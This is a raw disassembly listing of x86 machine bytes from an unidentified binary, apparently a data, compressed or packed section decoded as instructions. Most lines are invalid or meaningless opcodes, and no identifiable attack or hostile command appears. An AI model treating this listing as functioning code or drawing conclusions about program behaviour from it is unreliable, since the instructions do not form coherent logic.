  41819b:	adc    BYTE PTR [edi-0x78],dl
  41819e:	(bad)  
  41819f:	xlat   BYTE PTR ds:[ebx]
  4181a0:	add    DWORD PTR [ebp+edx*1+0x6],0x8b78b0
  4181a8:	mov    ah,0x2a
  4181aa:	js     0x4181b2
  4181ac:	add    BYTE PTR [eax],al
  4181ae:	add    bh,dh
  4181b0:	int3   
  4181b1:	call   0x76683956
  4181b6:	jno    0x41813b
  4181b8:	xor    BYTE PTR [eax-0x3f],0x69
  4181bc:	stos   DWORD PTR es:[edi],eax
  4181bd:	scas   al,BYTE PTR es:[edi]
  4181be:	and    dh,al
  4181c0:	adc    al,dl
  4181c2:	push   esi
  4181c3:	test   al,0x80
  4181c5:	jmp    0x1a1b4de6
  4181ca:	retf   0x1f
  4181cd:	mov    eax,ds:0x8fee777c
  4181d2:	add    BYTE PTR [eax],al
  4181d4:	bound  esi,QWORD PTR [ebp-0x1000000]
  4181da:	(bad)  
  4181db:	(bad)  
  4181dc:	(bad)  
  4181dd:	(bad)  
  4181de:	(bad)  
  4181df:	(bad)  
  4181e0:	(bad)  
  4181e1:	jmp    FWORD PTR [esi+0x6f]
  4181e4:	leave  
  4181e5:	call   0xe92a6ad2
  4181ea:	call   0x762a6ad7
  4181ef:	jne    0x4181c5
  4181f1:	cmc    
  4181f2:	retf   
  4181f3:	pop    edi
  4181f4:	dec    ebx
  4181f5:	out    0x11,al
  4181f7:	mov    dh,BYTE PTR [ebx-0x67]
  4181fa:	adc    eax,0xae8708ab
  4181ff:	push   ebp
  418200:	dec    ecx
  418201:	adc    BYTE PTR [eax],dl
  418203:	loope  0x418210
  418205:	jo     0x418279
  418207:	adc    al,0x75
  418209:	jne    0x4181fe
  41820b:	mov    edx,0xae265d84
  418210:	icebp  
  418211:	mov    eax,ds:0x832810b8
  418216:	push   esp
  418217:	out    0x5e,al
  418219:	and    eax,0xf99250a5
  41821e:	pop    esp
  41821f:	sar    DWORD PTR [ebx+eax*2+0x2d00a579],cl
  418226:	repz jne 0x41829e
  418229:	adc    al,0x90
  41822b:	xchg   edx,eax
  41822c:	jne    0x4182a3
  41822e:	inc    esi
  41822f:	test   al,0x54
  418231:	jne    0x418233
  418233:	icebp  
  418234:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418235:	cwde   
  418236:	not    BYTE PTR ds:0x745c71a3
  41823c:	sahf   
  41823d:	push   eax
  41823e:	dec    esi
  41823f:	mov    eax,ds:0x4606f817
  418244:	(bad)  
  418246:	push   ebp
  418247:	inc    edx
  418248:	adc    al,0x16
  41824a:	outs   dx,DWORD PTR ds:[esi]
  41824b:	add    BYTE PTR [eax],al
  41824d:	add    ah,bh
  41824f:	sub    eax,DWORD PTR [eax]
  418251:	add    dh,ah
  418253:	loope  0x418255
	...
  41825d:	add    BYTE PTR [eax],al
  41825f:	add    BYTE PTR [ecx-0x54],ch
  418262:	je     0x4181f0
  418264:	inc    ebp
  418265:	(bad)  
  418266:	jg     0x41824d
  418268:	(bad)  
  418269:	cdq    
  41826a:	popa   
  41826b:	or     BYTE PTR [edx-0x2f],bh
  41826e:	sub    eax,0xc193edd8
  418273:	std    
  418274:	mov    cl,0x10
  418276:	retf   
  418277:	pop    edx
	...
  418280:	add    BYTE PTR [eax],al
  418282:	add    BYTE PTR [edx+0xadc773],ch
  418288:	add    BYTE PTR [edi],ch
  41828a:	cli    
  41828b:	data16 sbb al,0x27
  41828e:	retf   
  41828f:	inc    ebx
  418290:	add    eax,0x4de1e37a
  418295:	and    dh,BYTE PTR [edx+0x1a]
  418298:	jmp    0xb18d:0x28f3e672
  41829f:	adc    eax,0x44c1ff68
  4182a4:	mov    ?,WORD PTR [edi]
  4182a6:	rol    al,0xed
  4182a9:	and    eax,0x7f94
  4182ae:	jb     0x4182e1
  4182b0:	add    BYTE PTR [eax],al
  4182b2:	out    0x56,eax
  4182b4:	and    al,BYTE PTR [eax]
  4182b6:	and    al,0xba
  4182b8:	push   es
  4182b9:	lahf   
  4182ba:	push   edx
  4182bb:	icebp  
  4182bc:	cs jo  0x418329
  4182bf:	retf   
  4182c0:	xor    esi,DWORD PTR [edx-0xedc1f58]
  4182c6:	bound  edx,QWORD PTR [eax-0x6e]
  4182c9:	mov    dh,0x93
  4182cb:	cdq    
  4182cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182cd:	test   ebx,ebx
  4182cf:	and    al,0x24
  4182d1:	and    al,0xae
  4182d3:	xchg   ebx,eax
  4182d4:	jo     0x4182aa
  4182d6:	mov    WORD PTR [ebx-0x45],fs
  4182d9:	fistp  QWORD PTR [eax+0x48]
  4182dc:	jns    0x4182fa
  4182de:	add    DWORD PTR [edx],esp
  4182e0:	(bad)  
  4182e1:	pop    eax
  4182e2:	fisttp QWORD PTR [ecx]
  4182e4:	mov    edx,0x7ac05989
  4182e9:	ins    DWORD PTR es:[edi],dx
  4182ea:	imul   ebx,ecx,0x31
  4182ed:	mov    dl,0xc7
  4182ef:	and    al,0x24
  4182f1:	add    eax,0x2424e323
  4182f6:	and    al,0x0
	...
  418300:	or     eax,0x858517a0
  418305:	test   DWORD PTR [ebp-0x7a7a7a7b],eax
  41830b:	test   edi,edi
  41830d:	call   FWORD PTR [ebx+0x48]
  418310:	js     0x418354
  418312:	xchg   BYTE PTR [edi+0x9],bl
  418315:	lods   eax,DWORD PTR ds:[esi]
  418316:	pushf  
  418317:	sbb    ebx,DWORD PTR ds:0xa4b57f9a
  41831d:	mov    al,ds:0x7620a02
  418322:	adc    dh,BYTE PTR [edi-0xc634]
  418328:	push   es
  418329:	clc    
  41832a:	(bad)  
  41832b:	(bad)  
  41832c:	jp     0x418378
  41832e:	(bad)  
  41832f:	(bad)  
  418330:	inc    BYTE PTR [ebx-0xa]
  418333:	or     eax,DWORD PTR [edx+0x6e]
  418336:	bound  esi,QWORD PTR [edx+0x6f]
  418339:	and    ah,BYTE PTR ds:[ebp+0x6d]
  41833d:	gs ins DWORD PTR es:[edi],dx
  41833f:	and    BYTE PTR [esi],ch
  418341:	push   edx
  418342:	imul   esp,DWORD PTR [ebp+0x69],0x6d783c69
  418349:	sub    DWORD PTR [edx+eiz*1],edi
  41834c:	cs inc esp
  41834e:	outs   dx,BYTE PTR ds:[esi]
  41834f:	bound  ecx,QWORD PTR [ebp+0x6d]
  418352:	outs   dx,DWORD PTR ds:[si]
  418354:	gs inc ecx
  418356:	imul   edi,DWORD PTR [esi],0x65796265
  41835c:	jb     0x4183b9
  41835e:	imul   esi,DWORD PTR [ebx+0x62],0x70616e73
  418365:	jb     0x4183a8
  418367:	ins    BYTE PTR es:[edi],dx
  418368:	imul   ebp,DWORD PTR [ebp+0x2e],0x6520763e
  41836f:	outs   dx,DWORD PTR ds:[esi]
  418370:	and    ah,BYTE PTR [eax]
  418372:	imul   ebp,DWORD PTR gs:[ebp+0x65],0x6f6d6362
  41837a:	push   ebx
  41837b:	ins    DWORD PTR es:[edi],dx
  41837c:	bound  edx,QWORD PTR [edx+0x72]
  41837f:	jne    0x4183fa
  418381:	outs   dx,DWORD PTR ds:[esi]
  418382:	push   edx
  418383:	gs jbe 0x4183b4
  418386:	jne    0x4183c4
  418388:	popa   
  418389:	ins    DWORD PTR es:[edi],dx
  41838a:	gs jb  0x4183fb
  41838d:	jae    0x4183af
  41838f:	cs jae 0x418408
  418392:	and    BYTE PTR [ebp+0x62],ah
  418395:	ins    DWORD PTR es:[edi],dx
  418396:	bound  ebp,QWORD PTR [edi+0x20]
  418399:	and    BYTE PTR [edi+0x52],ah
  41839c:	cs push eax
  41839e:	loope  0x4183e7
  4183a0:	out    dx,eax
  4183a1:	dec    edi
  4183a2:	stos   DWORD PTR es:[edi],eax
  4183a3:	jmp    0xc7a9:0x960e9ba8
  4183aa:	or     eax,0x9d51cac0
  4183af:	pop    esi
  4183b0:	push   DWORD PTR [edi+ecx*1-0x7f]
  4183b4:	icebp  
  4183b5:	mov    ds:0x5c747474,al
  4183ba:	or     al,0xa0
  4183bc:	push   es
  4183bd:	sbb    DWORD PTR [eax+ecx*8-0x67],esi
  4183c1:	pop    edx
  4183c2:	not    DWORD PTR [edx+esi*4+0x52ceaa73]
  4183c9:	cmp    BYTE PTR [ebx+0x61],ch
  4183cc:	in     eax,dx
  4183cd:	daa    
  4183ce:	addr16 dec ebx
  4183d0:	inc    edi
  4183d1:	arpl   cx,cx
  4183d3:	pop    esi
  4183d4:	sub    DWORD PTR [ebp-0x5c783a5b],esi
  4183da:	repz enter 0x7474,0xd6
  4183df:	gs je  0x418456
  4183e2:	je     0x4183e3
  4183e4:	(bad)  
  4183e5:	(bad)  
  4183e6:	(bad)  
  4183e7:	(bad)  
  4183e8:	(bad)  
  4183e9:	(bad)  
  4183ea:	(bad)  
  4183eb:	call   FWORD PTR [eax-0x58]
  4183ee:	mov    ecx,0x0
  4183f3:	add    BYTE PTR [eax],al
  4183f5:	add    BYTE PTR [eax],al
  4183f7:	add    BYTE PTR [eax],al
  4183f9:	add    cl,dl
  4183fb:	xor    dl,BYTE PTR [ebx+0x48ab55cb]
  418401:	mov    dh,0x9f
  418403:	inc    esi
  418404:	cmp    esi,DWORD PTR [ebp+0x3a3000dd]
  41840a:	icebp  
  41840b:	sbb    ah,ah
  41840d:	mov    cl,0x17
  41840f:	cld    
  418410:	jmp    0x418450
  418412:	add    BYTE PTR [eax],al
  418414:	sbb    bl,dh
  418416:	push   esi
  418417:	rol    DWORD PTR [edi],1
  418419:	pop    esi
  41841a:	sti    
  41841b:	arpl   bx,cx
  41841d:	dec    BYTE PTR [edi]
  41841f:	outs   dx,DWORD PTR ds:[esi]
  418420:	xor    DWORD PTR [ecx+0x63cdab83],ecx
  418426:	adc    al,0xee
  418428:	aad    0xd1
  41842a:	rol    edi,1
  41842c:	lahf   
  41842d:	push   esp
  41842e:	mov    dl,BYTE PTR [edi+eiz*4+0x0]
  418432:	add    BYTE PTR [edx+ebx*8-0x5ffff2d],cl
  418439:	int    0xff
  41843b:	add    BYTE PTR [eax],al
  41843d:	inc    ebp
  41843e:	invlpg BYTE PTR [ebp+0x37a849ee]
  418445:	in     eax,0xbc
  418447:	ficom  DWORD PTR [eax-0x44c4feb4]
  41844d:	add    al,0xc3
  41844f:	not    al
  418451:	mov    bl,0x4a
  418453:	test   eax,edi
  418455:	add    BYTE PTR [eax],al
  418457:	add    BYTE PTR [ebp+ebp*2+0x30f30000],dh
  41845e:	add    BYTE PTR [eax],al
  418460:	add    BYTE PTR [ebx-0x74747475],cl
  418466:	mov    ecx,DWORD PTR [ebx+0x73ad8b8b]
  41846c:	inc    esi
  41846d:	ret    
  41846e:	xor    al,BYTE PTR [eax]
  418470:	mov    esp,0x7bf1cea
  418475:	(bad)  
  418476:	inc    edx
  418477:	xlat   BYTE PTR ds:[ebx]
  418478:	test   ecx,eax
  41847a:	cdq    
  41847b:	jae    0x418496
  41847d:	sub    BYTE PTR [esi-0x7c7df2],cl
  418483:	(bad)  
  418484:	(bad)  
  418485:	(bad)  
  418486:	(bad)  
  418487:	(bad)  
  418488:	(bad)  
  418489:	(bad)  
  41848a:	inc    DWORD PTR [eax]
  41848c:	add    dl,ch
  41848e:	adc    ah,dh
  418490:	mov    eax,0x6d720000
  418495:	cwde   
  418496:	push   ecx
  418497:	or     eax,0x142e8f2c
  41849c:	mov    al,0x8c
  41849e:	pop    ss
  41849f:	dec    edi
  4184a0:	mov    al,ds:0xc9d7de3a
  4184a5:	cld    
  4184a6:	lods   eax,DWORD PTR ds:[esi]
  4184a7:	in     al,dx
  4184a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184a9:	hlt    
  4184aa:	mov    bl,0x3c
  4184ac:	loopne 0x418457
  4184ae:	inc    ebx
  4184af:	inc    esi
  4184b0:	int    0x7a
  4184b2:	lahf   
  4184b3:	lea    ebx,[edi+ebx*4]
  4184b6:	add    BYTE PTR [eax],al
  4184b8:	out    0xc4,eax
  4184ba:	add    BYTE PTR [eax],al
  4184bc:	leave  
  4184bd:	scas   eax,DWORD PTR es:[edi]
  4184be:	int3   
  4184bf:	add    BYTE PTR [eax],al
  4184c1:	push   esp
  4184c2:	jne    0x418444
  4184c4:	fs inc esi
  4184c6:	inc    ebp
  4184c7:	jo     0x4184dd
  4184c9:	sahf   
  4184ca:	cld    
  4184cb:	and    al,0x90
  4184cd:	imul   edi,DWORD PTR [ebp+edx*1+0x3dd963c7],0xb15fb891
  4184d8:	mov    al,BYTE PTR [eax]
  4184da:	add    BYTE PTR [eax],al
  4184dc:	ror    DWORD PTR ds:[eax+0x37],1
  4184e0:	ds jl  0x4184e5
  4184e3:	xlat   BYTE PTR ds:[ebx]
  4184e4:	in     al,dx
  4184e5:	jb     0x41852e
  4184e7:	dec    ecx
  4184e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184e9:	pop    edi
  4184ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184eb:	jbe    0x41854d
  4184ed:	push   cs
  4184ee:	sub    eax,DWORD PTR [edi]
  4184f0:	pop    eax
  4184f1:	pop    esp
  4184f2:	mov    BYTE PTR [esi+edx*2-0x3b],dl
  4184f6:	add    edi,eax
  4184f8:	dec    ebx
  4184f9:	add    BYTE PTR [eax],al
  4184fb:	mov    eax,ds:0x78f5
	...
  418508:	add    BYTE PTR [eax],al
  41850a:	cwde   
  41850b:	mov    ebx,0x8585850b
  418510:	test   DWORD PTR [ebp-0x7a7a7a7b],eax
  418516:	add    BYTE PTR [eax],al
  418518:	leave  
  418519:	adc    ch,dl
  41851b:	in     eax,dx
  41851c:	js     0x418502
  41851e:	fnstenv [eax-0x29]
  418521:	or     al,0xf3
  418523:	pop    eax
  418524:	add    al,0x66
  418526:	xchg   ebx,eax
  418527:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418528:	js     0x418596
  41852a:	out    0xc3,al
  41852c:	push   0x2a
  41852e:	ret    
  41852f:	rol    BYTE PTR [eax],1
  418531:	add    BYTE PTR ds:0x9e0000fd,dl
  418537:	mov    dl,0x0
  418539:	add    BYTE PTR [edx+0x666fe060],bl
  41853f:	pop    DWORD PTR [esp+eax*1]
  418542:	(bad)  
  418543:	mov    esi,0x54cd9101
  418548:	pusha  
  418549:	add    al,0x7a
  41854b:	lea    esi,[ebx]
  41854d:	or     al,0x82
  41854f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418550:	or     DWORD PTR [edx],edi
  418552:	add    BYTE PTR [eax],al
  418554:	fild   QWORD PTR [ebp+0xf8aa]
  41855a:	add    BYTE PTR [esi+edi*4-0xd0a6acf],ah
  418561:	mov    esi,DWORD PTR [eax-0x3e]
  418564:	and    ecx,DWORD PTR [ecx+0x3e]
  418567:	cmp    al,0x2e
  418569:	leave  
  41856a:	mov    ecx,0x1292e9a9
  41856f:	mov    al,0x4c
  418571:	xchg   edi,eax
  418572:	mov    cl,0xc7
  418574:	sbb    cl,BYTE PTR [ebx+edi*2]
  418577:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418578:	jo     0x4184ff
  41857a:	in     eax,dx
  41857b:	dec    esp
  41857c:	data16 daa 
  41857e:	add    BYTE PTR [eax],al
  418580:	mov    bl,0x6d
  418582:	add    BYTE PTR [eax],al
  418584:	add    BYTE PTR [ebp-0x72727273],cl
  41858a:	lea    ecx,[ebp+0xd6d8d8d]
  418590:	push   ds
	...
  418599:	add    BYTE PTR [eax],al
  41859b:	add    BYTE PTR [ebx],ah
  41859d:	js     0x418577
  41859f:	ret    
  4185a0:	aam    0x12
  4185a2:	shr    DWORD PTR [ecx-0x669d34b0],1
  4185a8:	in     al,dx
  4185a9:	enter  0x9d3c,0x7d
  4185ad:	in     al,dx
  4185ae:	fld    TBYTE PTR [ebx+0x2eb203f5]
  4185b4:	add    BYTE PTR [eax],al
  4185b6:	imul   esi,edx,0xffffff91
  4185b9:	fstp   QWORD PTR [edx+edi*4]
  4185bc:	je     0x4185d6
  4185be:	dec    ecx
  4185bf:	pop    es
  4185c0:	pop    esp
  4185c1:	int    0xaf
  4185c3:	xlat   BYTE PTR ds:[ebx]
  4185c4:	cmp    al,0xb2
  4185c6:	push   edx
  4185c7:	out    dx,eax
  4185c8:	and    al,0xe8
  4185ca:	icebp  
  4185cb:	fisub  DWORD PTR [ecx-0x62]
  4185ce:	mov    es,WORD PTR [esi-0x6e]
  4185d1:	stos   DWORD PTR es:[edi],eax
  4185d2:	adc    al,BYTE PTR [eax]
  4185d4:	add    dh,dl
  4185d6:	stos   DWORD PTR es:[edi],eax
  4185d7:	test   BYTE PTR [eax],al
  4185d9:	add    BYTE PTR [esp+eiz*2],al
  4185dc:	in     al,0x0
  4185de:	jne    0x4185a7
  4185e0:	sti    
  4185e1:	nop
  4185e2:	xchg   ebp,eax
  4185e3:	iret   
  4185e4:	ss jmp 0xe375:0x66bdb551
  4185ec:	outs   dx,DWORD PTR ss:[esi]
  4185ee:	leave  
  4185ef:	push   ebp
  4185f0:	stc    
  4185f1:	push   ds
  4185f2:	rol    DWORD PTR [edi+0x3c],0x8f
  4185f6:	adc    esi,DWORD PTR [ebp+0x75]
  4185f9:	jne    0x4185e7
  4185fb:	div    BYTE PTR [ebp+0x75]
  4185fe:	(bad)  
  4185ff:	pop    ds
  418600:	jne    0x418677
  418602:	jne    0x418604
	...
  41860c:	and    DWORD PTR [edi],edi
  41860e:	and    eax,0x79f16ea6
  418613:	aam    0x7b
  418615:	into   
  418616:	pop    es
  418617:	addr16 pop es
  418619:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41861a:	ins    DWORD PTR es:[edi],dx
  41861b:	xchg   esi,eax
  41861c:	fs dec edi
  41861e:	sub    BYTE PTR [ecx+0x24],0xae
  418622:	stos   BYTE PTR es:[edi],al
  418623:	rol    BYTE PTR [eax],cl
	...
  41862d:	add    BYTE PTR [eax],al
  41862f:	sbb    BYTE PTR [ebp+0xc4d0],ch
  418635:	dec    ecx
  418636:	test   eax,0x5ca300fd
  41863b:	mov    bl,BYTE PTR [ebp+0x1e91401f]
  418641:	rcl    BYTE PTR [ebx+0x409358c5],cl
  418647:	and    DWORD PTR [eax+0x2d4f6308],ebp
  41864d:	mov    ds:0x5c2b8590,al
  418652:	xlat   BYTE PTR ds:[ebx]
  418653:	cmp    bl,BYTE PTR [eax+0xa7572c]
  418659:	add    bl,dl
  41865b:	dec    ecx
  41865c:	add    BYTE PTR [eax],al
  41865e:	mov    bl,0xca
  418660:	jo     0x418662
  418662:	call   0x4a0c7fe
  418667:	out    dx,al
  418668:	inc    ebp
  418669:	xchg   BYTE PTR [edi+esi*2+0x44f190c],cl
  418670:	jmp    0x81db:0xf05ce2e4
  418677:	sub    ecx,0x74
  41867a:	xor    eax,0x27e8e8e8
  41867f:	scas   al,BYTE PTR es:[edi]
  418680:	int    0x4a
  418682:	cmp    ecx,edi
  418684:	xchg   ecx,eax
  418685:	add    eax,esp
  418687:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  418689:	aam    0x5e
  41868b:	pusha  
  41868c:	ins    DWORD PTR es:[edi],dx
  41868d:	cs jns 0x418654
  418690:	inc    edx
  418691:	in     eax,dx
  418692:	add    al,0xd
  418694:	push   0xffffffc7
  418696:	fcomp  DWORD PTR [edx-0x17f80487]
  41869c:	call   0xe8be316e
  4186a1:	call   0x7463f58e
  4186a6:	inc    ecx
  4186a7:	cmp    ch,BYTE PTR [ebx+0x57]
  4186aa:	and    BYTE PTR [ebx+0x62],al
  4186ad:	cmp    al,0x74
  4186af:	dec    esi
  4186b0:	jbe    0x418713
  4186b2:	jbe    0x418719
  4186b4:	das    
  4186b5:	sub    al,0x6f
  4186b7:	gs dec ebp
  4186b9:	and    BYTE PTR [ebx+0x2e],ah
  4186bc:	dec    ebp
  4186bd:	ins    BYTE PTR es:[edi],dx
  4186be:	inc    edx
  4186bf:	and    ah,BYTE PTR [eax]
  4186c1:	outs   dx,DWORD PTR ds:[esi]
  4186c2:	jo     0x418733
  4186c4:	push   bx
  4186c6:	imul   esp,DWORD PTR [ebp+eiz*2+0x70],0x6d416565
  4186ce:	jbe    0x4186fe
  4186d0:	ins    DWORD PTR es:[edi],dx
  4186d1:	popa   
  4186d2:	gs cmp eax,0xd76620d
  4186d8:	ins    DWORD PTR es:[edi],dx
  4186d9:	and    ah,BYTE PTR [bp+si+0x70]
  4186dd:	imul   dx,WORD PTR [ebx+0x20],0x656e
  4186e3:	outs   dx,DWORD PTR ds:[esi]
  4186e4:	outs   dx,BYTE PTR ds:[esi]
  4186e5:	and    BYTE PTR [ebp+0x20],ch
  4186e8:	bound  edi,QWORD PTR [edi+eiz*2]
  4186eb:	and    BYTE PTR gs:[edi+0x2f],ch
  4186ef:	push   eax
  4186f0:	ds das 
  4186f2:	outs   dx,BYTE PTR ds:[esi]
  4186f3:	gs jae 0x418748
  4186f6:	jb     0x41875d
  4186f8:	imul   edi,DWORD PTR [eiz*2+0x70656928],0x74693a0d
  418703:	imul   ebp,DWORD PTR [ecx+0xd],0x4d446561
  41870a:	ins    DWORD PTR es:[edi],dx
  41870b:	ins    DWORD PTR es:[edi],dx
  41870c:	ds ins DWORD PTR es:[edi],dx
  41870e:	ins    DWORD PTR es:[edi],dx
  41870f:	outs   dx,BYTE PTR cs:[esi]
  418711:	or     eax,0x655369
	...
  41871e:	(bad)  
  418720:	inc    ebx
	...
  418729:	add    BYTE PTR [eax],al
  41872b:	add    BYTE PTR [ebx],cl
  41872d:	or     dl,BYTE PTR [esi+edi*2]
  418730:	mov    cl,0x40
  418732:	push   es
  418733:	adc    dl,ah
  418735:	sub    DWORD PTR [esp+ecx*2],ebp
  418738:	pop    esi
  418739:	popa   
  41873a:	stos   DWORD PTR es:[edi],eax
  41873b:	cmp    DWORD PTR [esi-0x558b2a01],edx
  418741:	mov    eax,ds:0x271a
  418746:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418747:	and    al,BYTE PTR [eax]
  418749:	add    BYTE PTR [esi+0x1a000081],bl
  41874f:	inc    esp
  418750:	lahf   
  418751:	mov    ecx,0xd5efd18e
  418756:	add    dl,BYTE PTR ds:0x520f8751
  41875c:	adc    eax,DWORD PTR [eax-0x6c]
  41875f:	rol    DWORD PTR [ecx],1
  418761:	test   BYTE PTR [esi+edi*8+0x70],bh
  418765:	dec    esp
  418766:	add    BYTE PTR [ecx-0x55894d47],cl
  41876c:	mov    DWORD PTR [ecx+0x1af98089],ecx
  418772:	or     DWORD PTR [edx],ebp
  418774:	je     0x418707
  418776:	mov    cs,eax
  418778:	dec    ecx
  418779:	in     eax,dx
  41877a:	mov    eax,0xf12c6174
  41877f:	push   0xeae2453c
  418784:	repz repz inc esp
  418787:	inc    edx
  418788:	sbb    BYTE PTR [edi-0x4816547d],bl
  41878e:	inc    ecx
  41878f:	sbb    edi,DWORD PTR [eax+0x13]
  418792:	mov    DWORD PTR [ecx-0x7676fea2],ecx
  418798:	mov    edi,edi
  41879a:	(bad)  
  41879b:	(bad)  
  41879c:	(bad)  
  41879d:	(bad)  
  41879e:	(bad)  
  41879f:	(bad)  
  4187a0:	(bad)  
  4187a1:	dec    DWORD PTR [ebx+eax*2-0x40]
  4187a5:	mov    DWORD PTR [ecx-0x76767677],ecx
  4187ab:	mov    DWORD PTR [ecx-0x708b8b77],ecx
  4187b1:	sbb    edx,DWORD PTR [esi-0x42]
  4187b4:	or     BYTE PTR [ecx-0x3906532a],ah
  4187ba:	dec    esi
  4187bb:	outs   dx,DWORD PTR ds:[esi]
  4187bc:	xchg   BYTE PTR [ebx],ch
  4187be:	fsubrp st(5),st
  4187c0:	dec    eax
  4187c1:	outs   dx,DWORD PTR ds:[esi]
  4187c2:	xor    al,BYTE PTR [eax+eiz*8+0x745e4bc9]
  4187c9:	je     0x4187df
  4187cb:	jae    0x418772
  4187cd:	adc    DWORD PTR [edx+0x5c57e60b],ebx
  4187d3:	repz jg 0x418850
  4187d6:	push   es
  4187d7:	bnd jp 0x418763
  4187da:	sub    eax,0x74967b52
  4187df:	and    eax,0x95835ad8
  4187e4:	inc    eax
  4187e5:	iret   
  4187e6:	xor    DWORD PTR [esp+esi*2-0x39],esi
  4187ea:	test   BYTE PTR [esi+0x74],0x74
  4187ee:	rcr    BYTE PTR [ebx+0x5d007433],0x31
  4187f5:	ret    0x34d6
  4187f8:	mov    ebp,0x4d0f10aa
  4187fd:	aas    
  4187fe:	push   eax
  4187ff:	dec    ecx
  418800:	xor    esp,DWORD PTR [ebp+0x5e0d0f17]
  418806:	sub    DWORD PTR [edi],esp
  418808:	mov    edi,0x5724
  41880d:	add    BYTE PTR [ecx-0x54ffffe1],ah
  418813:	xor    al,BYTE PTR [eax]
  418815:	add    BYTE PTR [eax],al
  418817:	call   0xe92a7104
  41881c:	call   0x252a7109
  418821:	shl    DWORD PTR [edx-0x52],0x3
  418825:	(bad)  
  418827:	hlt    
  418828:	hlt    
  418829:	outs   dx,BYTE PTR ds:[esi]
  41882a:	aad    0xc2
  41882c:	mov    esp,db5
  41882f:	std    
  418830:	out    0x35,eax
  418832:	pop    esp
  418833:	jne    0x418897
  418835:	ins    DWORD PTR es:[edi],dx
  418836:	sub    eax,esi
	...
  418840:	add    BYTE PTR [eax],al
  418842:	add    BYTE PTR [ebp+ebx*1+0x9051],bl
  418849:	mov    BYTE PTR [ebx],cl
  41884b:	add    BYTE PTR [edi+0x7d29f6a3],0x89
  418852:	jmp    0x418886
  418854:	in     eax,dx
  418855:	out    dx,al
  418856:	xor    BYTE PTR ds:[edi],0xcb
  41885a:	mov    edi,eax
  41885c:	jmp    0x91048265
  418861:	sbb    edi,edx
  418863:	add    al,BYTE PTR [esi+0x33]
  418866:	mov    ebx,0x77df70cc
  41886b:	repnz add BYTE PTR [eax],al
  41886e:	xchg   esp,eax
  41886f:	mov    WORD PTR [eax],es
  418871:	add    cl,ah
  418873:	std    
  418874:	xchg   BYTE PTR [eax],al
  418876:	inc    DWORD PTR [esi-0x7a]
  418879:	ss nop
  41887b:	adc    bl,BYTE PTR [edx+0xb7fdb1b]
  418881:	rcr    BYTE PTR [esi+0x57],cl
  418884:	inc    edi
  418885:	out    dx,al
  418886:	ss leave 
  418888:	cmp    BYTE PTR [esi],ah
  41888a:	inc    edi
  41888b:	mov    esp,0xff2b7626
  418890:	(bad)  
  418891:	push   DWORD PTR [ecx-0x2d]
  418894:	fnsave [esi]
  418896:	mov    dh,0x94
  418898:	out    dx,al
  418899:	and    DWORD PTR [eax],ecx
  41889b:	mov    ss,WORD PTR [eax]
  41889d:	ror    DWORD PTR [ebx],0x0
  4188a0:	jecxz  0x418848
  4188a2:	enter  0x54b0,0xc7
  4188a6:	xor    BYTE PTR [edi-0xc],0x27
  4188aa:	inc    edx
  4188ab:	mov    ecx,0xff54c772
  4188b0:	jmp    FWORD PTR [edi]
  4188b2:	adc    DWORD PTR [ecx-0x1],ebp
  4188b5:	(bad)  
  4188b6:	inc    DWORD PTR [esp+eax*1]
  4188b9:	add    al,0x4
  4188bb:	add    al,0x4
  4188bd:	add    al,0x4
  4188bf:	add    al,0x40
  4188c1:	int    0xeb
  4188c3:	call   0xe92a71b0
  4188c8:	call   0x2a71b5
  4188cd:	(bad)  
  4188ce:	js     0x4188e1
  4188d0:	popf   
  4188d1:	inc    eax
  4188d2:	push   edx
  4188d3:	add    DWORD PTR [ebp+0x8],ebx
  4188d6:	mov    ebp,0xa48a0fa5
  4188db:	jnp    0x41892d
  4188dd:	les    ebp,FWORD PTR [ebx-0x3f4f51d3]
  4188e3:	gs ins DWORD PTR es:[edi],dx
  4188e5:	imul   edi,edi,0xfffcedff
  4188eb:	(bad)  
  4188ec:	cld    
  4188ed:	sar    edi,1
  4188ef:	jmp    FWORD PTR ds:0x7c50bc73
  4188f5:	stc    
  4188f6:	jae    0x418881
  4188f8:	sub    DWORD PTR [edi+eax*1-0x8],ebx
  4188fc:	(bad)  
  4188fd:	mov    ah,0xb5
  4188ff:	sbb    eax,0xd4c72a89
  418904:	cld    
  418905:	or     BYTE PTR [edx-0xeff009d],al
  41890b:	jns    0x41892d
  41890d:	jmp    0x6b418912
  418912:	es ds in al,0x2b
  418916:	mov    dl,0x66
  418918:	pop    eax
  418919:	pop    edx
  41891a:	lds    ebx,FWORD PTR [ebx+0x32]
  41891d:	(bad)
  418920:	retf   
  418921:	in     eax,0xc9
  418923:	es ins DWORD PTR es:[edi],dx
  418925:	mov    ch,0xd7
  418927:	and    eax,0x3a9585b
  41892c:	scas   al,BYTE PTR es:[edi]
  41892d:	f2xm1  
  41892f:	and    edx,ecx
  418931:	pop    esp
  418932:	sub    eax,0x4c0000c0
  418937:	pop    ebp
  418938:	add    BYTE PTR [eax],al
  41893a:	add    al,al
  41893c:	rol    al,0xc0
  41893f:	rol    al,0xc0
  418942:	rol    al,0x1b
  418945:	add    eax,0x6
  41894a:	add    BYTE PTR [eax],al
  41894c:	add    BYTE PTR [eax],al
  41894e:	add    BYTE PTR [eax],al
  418950:	and    al,0x24
  418952:	sub    DWORD PTR [eax+0x54dbc5d2],edx
  418958:	cwde   
  418959:	popf   
  41895a:	(bad)  
  41895b:	in     al,dx
  41895c:	int3   
  41895d:	stos   DWORD PTR es:[edi],eax
  41895e:	scas   eax,DWORD PTR es:[edi]
  41895f:	fist   DWORD PTR [ebx+0x503c1786]
  418965:	leave  
  418966:	nop
  418967:	or     al,0xc4
  418969:	call   0xbcee:0xf8ef2424
  418970:	dec    ebx
  418971:	mov    ds:0x37ef9b22,al
  418976:	xor    al,0xa5
  418978:	mov    eax,esi
  41897a:	jl     0x418937
  41897c:	mov    ah,0x25
  41897e:	in     al,dx
  41897f:	(bad)  [esi+0x45fbbddf]
